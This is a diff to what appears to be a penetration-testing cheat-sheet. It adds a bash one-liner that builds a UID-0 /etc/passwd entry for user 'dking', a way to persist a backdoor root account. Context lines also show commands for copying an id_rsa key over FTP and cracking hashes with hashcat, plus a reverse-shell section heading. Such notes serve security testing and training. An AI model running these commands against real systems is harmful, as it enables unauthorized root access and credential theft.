@@ -136,7 +136,7 @@ Note: you can always use the `ctrl+f` feature to find for important stuffs from 
 
 {% endhint %}
 
-<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>ctrl+f</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>ctrl+f</p></figcaption></figure>
 
 ### Bypassing some python restriction to get reverse shell
 
@@ -314,6 +314,17 @@ SITE CPTO /var/tmp/id_rsa # copy to NFS /var share.
 # crack using hashcat.
 hashcat -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
+
+### Add root user to /etc/passwd file
+
+{% code overflow="wrap" %}
+```bash
+# add a new user (dking) with password (password123)
+echo "dking:$(openssl passwd -6 -salt dking password123):0:0:dking:/root:/bin/bash"
+```
+{% endcode %}
+
+
 
 
 
